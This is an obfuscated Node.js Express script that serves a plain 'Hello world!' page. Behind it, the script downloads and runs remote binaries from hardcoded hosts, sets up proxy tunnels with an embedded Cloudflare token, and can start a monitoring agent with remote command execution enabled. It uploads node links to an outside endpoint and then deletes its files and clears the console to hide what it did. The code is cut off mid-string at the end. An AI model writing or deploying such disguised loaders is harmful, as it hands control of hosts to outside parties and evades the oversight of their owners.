const _0x5abc1c=_0x229f;(function(_0x470c15,_0x1b7c70){const _0x2d8e95=_0x229f,_0x20fd88=_0x470c15();while(!![]){try{const _0x2dc17d=-parseInt(_0x2d8e95(0x1f3))/0x1*(parseInt(_0x2d8e95(0x182))/0x2)+-parseInt(_0x2d8e95(0x1dc))/0x3*(-parseInt(_0x2d8e95(0x210))/0x4)+-parseInt(_0x2d8e95(0x197))/0x5+parseInt(_0x2d8e95(0x1d3))/0x6*(parseInt(_0x2d8e95(0x174))/0x7)+-parseInt(_0x2d8e95(0x209))/0x8*(-parseInt(_0x2d8e95(0x169))/0x9)+-parseInt(_0x2d8e95(0x1a2))/0xa+parseInt(_0x2d8e95(0x17a))/0xb*(parseInt(_0x2d8e95(0x1d2))/0xc);if(_0x2dc17d===_0x1b7c70)break;else _0x20fd88['push'](_0x20fd88['shift']());}catch(_0x3df9da){_0x20fd88['push'](_0x20fd88['shift']());}}}(_0x2171,0x28b3b));const express=require('express'),app=express(),axios=require(_0x5abc1c(0x1c4)),os=require('os'),fs=require('fs'),path=require(_0x5abc1c(0x170)),{promisify}=require(_0x5abc1c(0x1e2)),exec=promisify(require(_0x5abc1c(0x178))[_0x5abc1c(0x188)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x5abc1c(0x1d4)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x5abc1c(0x1d4)][_0x5abc1c(0x1a9)]||'',AUTO_ACCESS=process[_0x5abc1c(0x1d4)][_0x5abc1c(0x1b8)]||![],FILE_PATH=process[_0x5abc1c(0x1d4)][_0x5abc1c(0x21d)]||_0x5abc1c(0x184),SUB_PATH=process[_0x5abc1c(0x1d4)]['SUB_PATH']||_0x5abc1c(0x205),PORT=process[_0x5abc1c(0x1d4)][_0x5abc1c(0x1db)]||process[_0x5abc1c(0x1d4)]['PORT']||0xbb8,UUID=process[_0x5abc1c(0x1d4)][_0x5abc1c(0x1b9)]||_0x5abc1c(0x18d),NEZHA_SERVER=process[_0x5abc1c(0x1d4)][_0x5abc1c(0x20d)]||'',NEZHA_PORT=process[_0x5abc1c(0x1d4)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x5abc1c(0x1d4)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x5abc1c(0x1d4)][_0x5abc1c(0x20b)]||_0x5abc1c(0x1e3),ARGO_AUTH=process[_0x5abc1c(0x1d4)][_0x5abc1c(0x183)]||_0x5abc1c(0x198),ARGO_PORT=process['env'][_0x5abc1c(0x1bf)]||0x1f41,CFIP=process['env'][_0x5abc1c(0x1e1)]||_0x5abc1c(0x221),CFPORT=process[_0x5abc1c(0x1d4)][_0x5abc1c(0x193)]||0x1bb,NAME=process['env'][_0x5abc1c(0x18f)]||'';!fs[_0x5abc1c(0x19d)](FILE_PATH)?(fs[_0x5abc1c(0x1b4)](FILE_PATH),console[_0x5abc1c(0x16e)](FILE_PATH+_0x5abc1c(0x1c2))):console[_0x5abc1c(0x16e)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x654dc0=_0x5abc1c,_0x489947=_0x654dc0(0x165);let _0x5d7f15='';for(let _0x4d5d1f=0x0;_0x4d5d1f<0x6;_0x4d5d1f++){_0x5d7f15+=_0x489947[_0x654dc0(0x21c)](Math[_0x654dc0(0x16c)](Math[_0x654dc0(0x172)]()*_0x489947['length']));}return _0x5d7f15;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5abc1c(0x1e5)](FILE_PATH,npmName),phpPath=path[_0x5abc1c(0x1e5)](FILE_PATH,phpName),webPath=path[_0x5abc1c(0x1e5)](FILE_PATH,webName),botPath=path[_0x5abc1c(0x1e5)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x5abc1c(0x176)),listPath=path[_0x5abc1c(0x1e5)](FILE_PATH,'list.txt'),bootLogPath=path[_0x5abc1c(0x1e5)](FILE_PATH,_0x5abc1c(0x1f8)),configPath=path['join'](FILE_PATH,_0x5abc1c(0x218));function deleteNodes(){const _0x77bf69=_0x5abc1c;try{if(!UPLOAD_URL)return;if(!fs[_0x77bf69(0x19d)](subPath))return;let _0x30274c;try{_0x30274c=fs[_0x77bf69(0x1da)](subPath,_0x77bf69(0x162));}catch{return null;}const _0x16e5a0=Buffer[_0x77bf69(0x1ea)](_0x30274c,_0x77bf69(0x1a6))[_0x77bf69(0x17d)](_0x77bf69(0x162)),_0x290cf3=_0x16e5a0[_0x77bf69(0x1a1)]('\x0a')[_0x77bf69(0x1a7)](_0x3297f6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x77bf69(0x1bd)](_0x3297f6));if(_0x290cf3['length']===0x0)return;return axios[_0x77bf69(0x1d9)](UPLOAD_URL+_0x77bf69(0x15f),JSON[_0x77bf69(0x187)]({'nodes':_0x290cf3}),{'headers':{'Content-Type':_0x77bf69(0x1b5)}})[_0x77bf69(0x217)](_0x14b627=>{return null;}),null;}catch(_0x276049){return null;}}function cleanupOldFiles(){const _0x29d256=_0x5abc1c;try{const _0x3aa801=fs[_0x29d256(0x1de)](FILE_PATH);_0x3aa801[_0x29d256(0x168)](_0xaf26=>{const _0x78054a=_0x29d256,_0x51f058=path[_0x78054a(0x1e5)](FILE_PATH,_0xaf26);try{const _0x3e8f73=fs[_0x78054a(0x19f)](_0x51f058);_0x3e8f73[_0x78054a(0x1be)]()&&fs['unlinkSync'](_0x51f058);}catch(_0x2c106c){}});}catch(_0x28c9a8){}}app[_0x5abc1c(0x161)]('/',function(_0x44d664,_0x2b2494){const _0x13dafe=_0x5abc1c;_0x2b2494[_0x13dafe(0x16d)](_0x13dafe(0x1f7));});function _0x229f(_0x355a92,_0x45bccb){_0x355a92=_0x355a92-0x15d;const _0x217161=_0x2171();let _0x229ff7=_0x217161[_0x355a92];return _0x229ff7;}async function generateConfig(){const _0x151539=_0x5abc1c,_0x2cd67f={'log':{'access':'/dev/null','error':_0x151539(0x212),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x151539(0x220)}],'decryption':_0x151539(0x1fb),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x151539(0x164),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x151539(0x1fe)}},{'port':0xbb9,'listen':_0x151539(0x1f5),'protocol':_0x151539(0x1b0),'settings':{'clients':[{'id':UUID}],'decryption':_0x151539(0x1fb)},'streamSettings':{'network':_0x151539(0x1fe),'security':'none'}},{'port':0xbba,'listen':_0x151539(0x1f5),'protocol':_0x151539(0x1b0),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x151539(0x1fb)},'streamSettings':{'network':'ws','security':_0x151539(0x1fb),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x151539(0x1cb),'tls',_0x151539(0x199)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x151539(0x1cb),_0x151539(0x1f0),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x151539(0x1f9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x151539(0x1fb),'wsSettings':{'path':_0x151539(0x177)}},'sniffing':{'enabled':!![],'destOverride':[_0x151539(0x1cb),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x151539(0x191)]},'outbounds':[{'protocol':_0x151539(0x201),'tag':_0x151539(0x16a)},{'protocol':_0x151539(0x1c5),'tag':_0x151539(0x185)}]};fs['writeFileSync'](path[_0x151539(0x1e5)](FILE_PATH,_0x151539(0x218)),JSON['stringify'](_0x2cd67f,null,0x2));}function getSystemArchitecture(){const _0x7d7588=_0x5abc1c,_0x13a0e7=os[_0x7d7588(0x1a5)]();return _0x13a0e7===_0x7d7588(0x1b2)||_0x13a0e7===_0x7d7588(0x1e0)||_0x13a0e7==='aarch64'?'arm':_0x7d7588(0x1d7);}function downloadFile(_0xee89b5,_0x2b071c,_0x16e5dc){const _0x55a6bb=_0x5abc1c,_0x1e9e3f=_0xee89b5;!fs[_0x55a6bb(0x19d)](FILE_PATH)&&fs[_0x55a6bb(0x1b4)](FILE_PATH,{'recursive':!![]});const _0x3e8132=fs[_0x55a6bb(0x1c3)](_0x1e9e3f);axios({'method':'get','url':_0x2b071c,'responseType':'stream'})[_0x55a6bb(0x1ed)](_0x4500ba=>{const _0x3b860b=_0x55a6bb;_0x4500ba[_0x3b860b(0x179)][_0x3b860b(0x1ae)](_0x3e8132),_0x3e8132['on'](_0x3b860b(0x1a3),()=>{const _0x268bb6=_0x3b860b;_0x3e8132[_0x268bb6(0x19a)](),console[_0x268bb6(0x16e)](_0x268bb6(0x186)+path[_0x268bb6(0x1e9)](_0x1e9e3f)+_0x268bb6(0x1a4)),_0x16e5dc(null,_0x1e9e3f);}),_0x3e8132['on'](_0x3b860b(0x1b6),_0x484b05=>{const _0x5d2d51=_0x3b860b;fs[_0x5d2d51(0x1c7)](_0x1e9e3f,()=>{});const _0x48ba9c='Download\x20'+path[_0x5d2d51(0x1e9)](_0x1e9e3f)+_0x5d2d51(0x213)+_0x484b05[_0x5d2d51(0x21f)];console[_0x5d2d51(0x1b6)](_0x48ba9c),_0x16e5dc(_0x48ba9c);});})[_0x55a6bb(0x217)](_0x3c6eaa=>{const _0x38ffc7=_0x55a6bb,_0x2ed564=_0x38ffc7(0x186)+path[_0x38ffc7(0x1e9)](_0x1e9e3f)+_0x38ffc7(0x213)+_0x3c6eaa[_0x38ffc7(0x21f)];console[_0x38ffc7(0x1b6)](_0x2ed564),_0x16e5dc(_0x2ed564);});}async function downloadFilesAndRun(){const _0x1197f4=_0x5abc1c,_0x2114d4=getSystemArchitecture(),_0x169ef5=getFilesForArchitecture(_0x2114d4);if(_0x169ef5[_0x1197f4(0x1d5)]===0x0){console[_0x1197f4(0x16e)](_0x1197f4(0x1b3));return;}const _0x1200c4=_0x169ef5['map'](_0x83034b=>{return new Promise((_0x53243f,_0x1d56c6)=>{const _0x187eff=_0x229f;downloadFile(_0x83034b[_0x187eff(0x219)],_0x83034b['fileUrl'],(_0xbe920e,_0x1affbf)=>{_0xbe920e?_0x1d56c6(_0xbe920e):_0x53243f(_0x1affbf);});});});try{await Promise['all'](_0x1200c4);}catch(_0x5bb89b){console[_0x1197f4(0x1b6)](_0x1197f4(0x192),_0x5bb89b);return;}function _0xaa85fc(_0x11f0cd){const _0x35ce1a=0x1fd;_0x11f0cd['forEach'](_0x28e2ea=>{const _0x4d8c08=_0x229f;fs[_0x4d8c08(0x19d)](_0x28e2ea)&&fs[_0x4d8c08(0x1cc)](_0x28e2ea,_0x35ce1a,_0x5e13a5=>{const _0x4bcd08=_0x4d8c08;_0x5e13a5?console[_0x4bcd08(0x1b6)](_0x4bcd08(0x1fa)+_0x28e2ea+':\x20'+_0x5e13a5):console[_0x4bcd08(0x16e)](_0x4bcd08(0x1a8)+_0x28e2ea+':\x20'+_0x35ce1a['toString'](0x8));});});}const _0x34bf23=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xaa85fc(_0x34bf23);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2c50ff=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1197f4(0x1a1)](':')['pop']():'',_0xcaa342=new Set(['443',_0x1197f4(0x1e6),_0x1197f4(0x196),_0x1197f4(0x1af),_0x1197f4(0x173),_0x1197f4(0x1fc)]),_0x5b2007=_0xcaa342['has'](_0x2c50ff)?_0x1197f4(0x20e):_0x1197f4(0x17b),_0x3fdca2='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x1197f4(0x1ee)+_0x5b2007+_0x1197f4(0x1bc)+UUID;fs[_0x1197f4(0x215)](path['join'](FILE_PATH,_0x1197f4(0x15d)),_0x3fdca2);const _0x139f6e=_0x1197f4(0x1aa)+phpPath+_0x1197f4(0x1ca)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x139f6e),console[_0x1197f4(0x16e)](phpName+_0x1197f4(0x206)),await new Promise(_0x4820c7=>setTimeout(_0x4820c7,0x3e8));}catch(_0x3b98a2){console[_0x1197f4(0x1b6)](_0x1197f4(0x1df)+_0x3b98a2);}}else{let _0x138b3b='';const _0x21ca3f=[_0x1197f4(0x17c),'8443',_0x1197f4(0x196),_0x1197f4(0x1af),_0x1197f4(0x173),_0x1197f4(0x1fc)];_0x21ca3f['includes'](NEZHA_PORT)&&(_0x138b3b=_0x1197f4(0x1cd));const _0x35254c=_0x1197f4(0x1aa)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x1197f4(0x1a0)+NEZHA_KEY+'\x20'+_0x138b3b+_0x1197f4(0x167);try{await exec(_0x35254c),console[_0x1197f4(0x16e)](npmName+_0x1197f4(0x206)),await new Promise(_0x5a82f2=>setTimeout(_0x5a82f2,0x3e8));}catch(_0x2c8604){console[_0x1197f4(0x1b6)]('npm\x20running\x20error:\x20'+_0x2c8604);}}}else console['log'](_0x1197f4(0x19e));const _0x178121=_0x1197f4(0x1aa)+webPath+_0x1197f4(0x1f2)+FILE_PATH+_0x1197f4(0x1ac);try{await exec(_0x178121),console['log'](webName+'\x20is\x20running'),await new Promise(_0x3b7856=>setTimeout(_0x3b7856,0x3e8));}catch(_0x2b8860){console[_0x1197f4(0x1b6)](_0x1197f4(0x1ab)+_0x2b8860);}if(fs[_0x1197f4(0x19d)](botPath)){let _0x3e5289;if(ARGO_AUTH[_0x1197f4(0x160)](/^[A-Z0-9a-z=]{120,250}$/))_0x3e5289=_0x1197f4(0x20f)+ARGO_AUTH;else ARGO_AUTH[_0x1197f4(0x160)](/TunnelSecret/)?_0x3e5289=_0x1197f4(0x21e)+FILE_PATH+_0x1197f4(0x1e8):_0x3e5289=_0x1197f4(0x17e)+FILE_PATH+_0x1197f4(0x19b)+ARGO_PORT;try{await exec(_0x1197f4(0x1aa)+botPath+'\x20'+_0x3e5289+_0x1197f4(0x1b7)),console[_0x1197f4(0x16e)](botName+_0x1197f4(0x206)),await new Promise(_0x559bcc=>setTimeout(_0x559bcc,0x7d0));}catch(_0x355b61){console[_0x1197f4(0x1b6)](_0x1197f4(0x1dd)+_0x355b61);}}await new Promise(_0x227f7c=>setTimeout(_0x227f7c,0x1388));}function getFilesForArchitecture(_0x4cd2c7){const _0x4d8e24=_0x5abc1c;let _0x3dd782;_0x4cd2c7===_0x4d8e24(0x1b2)?_0x3dd782=[{'fileName':webPath,'fileUrl':_0x4d8e24(0x1e7)},{'fileName':botPath,'fileUrl':_0x4d8e24(0x171)}]:_0x3dd782=[{'fileName':webPath,'fileUrl':_0x4d8e24(0x16f)},{'fileName':botPath,'fileUrl':_0x4d8e24(0x18a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2f2dea=_0x4cd2c7==='arm'?_0x4d8e24(0x18c):_0x4d8e24(0x1c8);_0x3dd782[_0x4d8e24(0x214)]({'fileName':npmPath,'fileUrl':_0x2f2dea});}else{const _0x411973=_0x4cd2c7===_0x4d8e24(0x1b2)?'https://arm64.ssss.nyc.mn/v1':_0x4d8e24(0x1ef);_0x3dd782[_0x4d8e24(0x214)]({'fileName':phpPath,'fileUrl':_0x411973});}}return _0x3dd782;}function argoType(){const _0x3fc167=_0x5abc1c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3fc167(0x16e)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x3fc167(0x19c)](_0x3fc167(0x1c1))){fs['writeFileSync'](path[_0x3fc167(0x1e5)](FILE_PATH,_0x3fc167(0x189)),ARGO_AUTH);const _0x12af26=_0x3fc167(0x208)+ARGO_AUTH[_0x3fc167(0x1a1)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3fc167(0x1e5)](FILE_PATH,_0x3fc167(0x189))+_0x3fc167(0x204)+ARGO_DOMAIN+_0x3fc167(0x175)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3fc167(0x215)](path[_0x3fc167(0x1e5)](FILE_PATH,_0x3fc167(0x1bb)),_0x12af26);}else console[_0x3fc167(0x16e)](_0x3fc167(0x1f1));}argoType();async function extractDomains(){const _0x3995e5=_0x5abc1c;let _0x57c907;if(ARGO_AUTH&&ARGO_DOMAIN)_0x57c907=ARGO_DOMAIN,console[_0x3995e5(0x16e)](_0x3995e5(0x203),_0x57c907),await _0x44b2cb(_0x57c907);else try{const _0x3e3d57=fs[_0x3995e5(0x1da)](path[_0x3995e5(0x1e5)](FILE_PATH,_0x3995e5(0x1f8)),_0x3995e5(0x162)),_0x4f2dfd=_0x3e3d57['split']('\x0a'),_0x1853c2=[];_0x4f2dfd[_0x3995e5(0x168)](_0x48c300=>{const _0x1f1a0a=_0x3995e5,_0x7ad5b2=_0x48c300['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x7ad5b2){const _0x393d46=_0x7ad5b2[0x1];_0x1853c2[_0x1f1a0a(0x202)](_0x393d46);}});if(_0x1853c2['length']>0x0)_0x57c907=_0x1853c2[0x0],console[_0x3995e5(0x16e)](_0x3995e5(0x20c),_0x57c907),await _0x44b2cb(_0x57c907);else{console['log'](_0x3995e5(0x1d8)),fs['unlinkSync'](path[_0x3995e5(0x1e5)](FILE_PATH,_0x3995e5(0x1f8)));async function _0x266f91(){const _0x538364=_0x3995e5;try{process[_0x538364(0x195)]==='win32'?await exec(_0x538364(0x181)+botName+_0x538364(0x1f6)):await exec(_0x538364(0x15e)+botName[_0x538364(0x21c)](0x0)+']'+botName[_0x538364(0x1b1)](0x1)+_0x538364(0x163));}catch(_0x3bcd56){}}_0x266f91(),await new Promise(_0x4ba2de=>setTimeout(_0x4ba2de,0xbb8));const _0xb7366a=_0x3995e5(0x17e)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xb7366a+_0x3995e5(0x1b7)),console[_0x3995e5(0x16e)](botName+_0x3995e5(0x206)),await new Promise(_0x1f6e27=>setTimeout(_0x1f6e27,0xbb8)),await extractDomains();}catch(_0x54647e){console[_0x3995e5(0x1b6)]('Error\x20executing\x20command:\x20'+_0x54647e);}}}catch(_0x5885eb){console['error'](_0x3995e5(0x18e),_0x5885eb);}async function _0x44b2cb(_0x356157){const _0x491a8f=_0x3995e5,_0x4491ea=execSync(_0x491a8f(0x1ba),{'encoding':_0x491a8f(0x162)}),_0x5dea0f=_0x4491ea['trim'](),_0x10ea91=NAME?NAME+'-'+_0x5dea0f:_0x5dea0f;return new Promise(_0x1e5d2a=>{setTimeout(()=>{const _0x48298e=_0x229f,_0x2f73a2={'v':'2','ps':''+_0x10ea91,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x48298e(0x1fb),'host':_0x356157,'path':_0x48298e(0x216),'tls':_0x48298e(0x1f0),'sni':_0x356157,'alpn':'','fp':_0x48298e(0x1c9)},_0x56158e=_0x48298e(0x211)+UUID+'@'+CFIP+':'+CFPORT+_0x48298e(0x1ec)+_0x356157+_0x48298e(0x190)+_0x356157+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x10ea91+_0x48298e(0x16b)+Buffer[_0x48298e(0x1ea)](JSON[_0x48298e(0x187)](_0x2f73a2))[_0x48298e(0x17d)](_0x48298e(0x1a6))+_0x48298e(0x1c0)+UUID+'@'+CFIP+':'+CFPORT+_0x48298e(0x207)+_0x356157+_0x48298e(0x190)+_0x356157+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x10ea91+_0x48298e(0x166);console[_0x48298e(0x16e)](Buffer[_0x48298e(0x1ea)](_0x56158e)['toString'](_0x48298e(0x1a6))),fs[_0x48298e(0x215)](subPath,Buffer['from'](_0x56158e)[_0x48298e(0x17d)](_0x48298e(0x1a6))),console[_0x48298e(0x16e)](FILE_PATH+_0x48298e(0x18b)),uploadNodes(),app[_0x48298e(0x161)]('/'+SUB_PATH,(_0xd180ab,_0x5c36cb)=>{const _0x1b20a7=_0x48298e,_0x2498cc=Buffer['from'](_0x56158e)[_0x1b20a7(0x17d)](_0x1b20a7(0x1a6));_0x5c36cb['set'](_0x1b20a7(0x180),'text/plain;\x20charset=utf-8'),_0x5c36cb[_0x1b20a7(0x16d)](_0x2498cc);}),_0x1e5d2a(_0x56158e);},0x7d0);});}}async function uploadNodes(){const _0x431cf5=_0x5abc1c;if(UPLOAD_URL&&PROJECT_URL){const _0x31dcb9=PROJECT_URL+'/'+SUB_PATH,_0x24a960={'subscription':[_0x31dcb9]};try{const _0xf65148=await axios['post'](UPLOAD_URL+_0x431cf5(0x1fd),_0x24a960,{'headers':{'Content-Type':_0x431cf5(0x1b5)}});return _0xf65148&&_0xf65148['status']===0xc8?(console[_0x431cf5(0x16e)](_0x431cf5(0x1c6)),_0xf65148):null;}catch(_0x5b46be){if(_0x5b46be[_0x431cf5(0x1d0)]){if(_0x5b46be[_0x431cf5(0x1d0)][_0x431cf5(0x1ff)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x431cf5(0x19d)](listPath))return;const _0x21c6f7=fs[_0x431cf5(0x1da)](listPath,_0x431cf5(0x162)),_0x3cc427=_0x21c6f7['split']('\x0a')[_0x431cf5(0x1a7)](_0xf73e8a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x431cf5(0x1bd)](_0xf73e8a));if(_0x3cc427[_0x431cf5(0x1d5)]===0x0)return;const _0x1bdd16=JSON[_0x431cf5(0x187)]({'nodes':_0x3cc427});try{const _0x32cbfc=await axios[_0x431cf5(0x1d9)](UPLOAD_URL+_0x431cf5(0x20a),_0x1bdd16,{'headers':{'Content-Type':_0x431cf5(0x1b5)}});return _0x32cbfc&&_0x32cbfc[_0x431cf5(0x1ff)]===0xc8?(console[_0x431cf5(0x16e)]('Nodes\x20uploaded\x20successfully'),_0x32cbfc):null;}catch(_0x8eba82){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xd7dc16=_0x229f,_0x38f175=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x38f175[_0xd7dc16(0x202)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x38f175[_0xd7dc16(0x202)](phpPath);process[_0xd7dc16(0x195)]===_0xd7dc16(0x1eb)?exec('del\x20/f\x20/q\x20'+_0x38f175[_0xd7dc16(0x1e5)]('\x20')+_0xd7dc16(0x21a),_0x330e7c=>{const _0x2796e1=_0xd7dc16;console[_0x2796e1(0x1ce)](),console[_0x2796e1(0x16e)](_0x2796e1(0x1f4)),console[_0x2796e1(0x16e)](_0x2796e1(0x17f));}):exec(_0xd7dc16(0x1d1)+_0x38f175[_0xd7dc16(0x1e5)]('\x20')+_0xd7dc16(0x194),_0x5dc8b9=>{const _0x4d24b2=_0xd7dc16;console[_0x4d24b2(0x1ce)](),console[_0x4d24b2(0x16e)](_0x4d24b2(0x1f4)),console[_0x4d24b2(0x16e)](_0x4d24b2(0x17f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4359dc=_0x5abc1c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4359dc(0x16e)](_0x4359dc(0x1ad));return;}try{const _0x30ac52=await axios[_0x4359dc(0x1d9)](_0x4359dc(0x1d6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4359dc(0x1b5)}});return console[_0x4359dc(0x16e)](_0x4359dc(0x200)),_0x30ac52;}catch(_0x39db3b){return console['error'](_0x4359dc(0x1e4)+_0x39db3b[_0x4359dc(0x21f)]),null;}}async function startserver(){const _0x36ee1b=_0x5abc1c;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xc10390){console[_0x36ee1b(0x1b6)](_0x36ee1b(0x21b),_0xc10390);}}startserver()[_0x5abc1c(0x217)](_0xd996c=>{const _0x136bd9=_0x5abc1c;console[_0x136bd9(0x1b6)](_0x136bd9(0x1cf),_0xd996c);}),app['listen'](PORT,()=>console[_0x5abc1c(0x16e)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));function _0x2171(){const _0x103d0e=['AUTO_ACCESS','UUID','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','tunnel.yml','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','test','isFile','ARGO_PORT','\x0a\x20\x20\x0atrojan://','TunnelSecret','\x20is\x20created','createWriteStream','axios','blackhole','Subscription\x20uploaded\x20successfully','unlink','https://amd64.ssss.nyc.mn/agent','firefox','\x20-c\x20\x22','http','chmod','--tls','clear','Unhandled\x20error\x20in\x20startserver:','response','rm\x20-rf\x20','4812OLvauC','30tJOKhG','env','length','https://oooo.serv00.net/add-url','amd','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','post','readFileSync','SERVER_PORT','10533KLAMWW','Error\x20executing\x20command:\x20','readdirSync','php\x20running\x20error:\x20','arm64','CFIP','util','clawrunsg.yueji-rights.com','Add\x20automatic\x20access\x20task\x20faild:\x20','join','8443','https://arm64.ssss.nyc.mn/web','/tunnel.yml\x20run','basename','from','win32','?encryption=none&security=tls&sni=','then','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://amd64.ssss.nyc.mn/v1','tls','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20-c\x20','463XxLEHR','App\x20is\x20running','127.0.0.1','.exe\x20>\x20nul\x202>&1','Hello\x20world!','boot.log','trojan','Empowerment\x20failed\x20for\x20','none','2053','/api/add-subscriptions','tcp','status','automatic\x20access\x20task\x20added\x20successfully','freedom','push','ARGO_DOMAIN:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','sub','\x20is\x20running','?security=tls&sni=','\x0a\x20\x20tunnel:\x20','8LgaqyW','/api/add-nodes','ARGO_DOMAIN','ArgoDomain:','NEZHA_SERVER','true','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','28qqSRqa','\x0avless://','/dev/null','\x20failed:\x20','unshift','writeFileSync','/vmess-argo?ed=2560','catch','config.json','fileName','\x20>\x20nul\x202>&1','Error\x20in\x20startserver:','charAt','FILE_PATH','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','message','xtls-rprx-vision','saas.sin.fan','config.yaml','pkill\x20-f\x20\x22[','/api/delete-nodes','match','get','utf-8','\x22\x20>\x20/dev/null\x202>&1','/vmess-argo','abcdefghijklmnopqrstuvwxyz','\x0a\x20\x20\x20\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','forEach','1147050yfuWXP','direct','\x0a\x20\x20\x0avmess://','floor','send','log','https://amd64.ssss.nyc.mn/web','path','https://arm64.ssss.nyc.mn/bot','random','2083','407939OBodAy','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','sub.txt','/trojan-argo','child_process','data','4631veBYSb','false','443','toString','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Content-Type','taskkill\x20/f\x20/im\x20','1170KLwCkA','ARGO_AUTH','./tmp','block','Download\x20','stringify','exec','tunnel.json','https://amd64.ssss.nyc.mn/bot','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/agent','bc97f674-c578-4940-9234-0a1da46041b9','Error\x20reading\x20boot.log:','NAME','&fp=firefox&type=ws&host=','https+local://8.8.8.8/dns-query','Error\x20downloading\x20files:','CFPORT','\x20>/dev/null\x202>&1','platform','2096','249885ACwozM','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiMzBhNDU5OGQtYzU1NC00MGZmLThiMDEtODc3YTg1NTVhZWI1IiwicyI6Ik5tSmlObVl3T0RFdE16WXpPQzAwTm1VekxXSTROR1F0TUROak5tRXhNREkxWkRNMyJ9','quic','close','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','includes','existsSync','NEZHA\x20variable\x20is\x20empty,skip\x20running','statSync','\x20-p\x20','split','1246860pexXpq','finish','\x20successfully','arch','base64','filter','Empowerment\x20success\x20for\x20','PROJECT_URL','nohup\x20','web\x20running\x20error:\x20','/config.json\x20>/dev/null\x202>&1\x2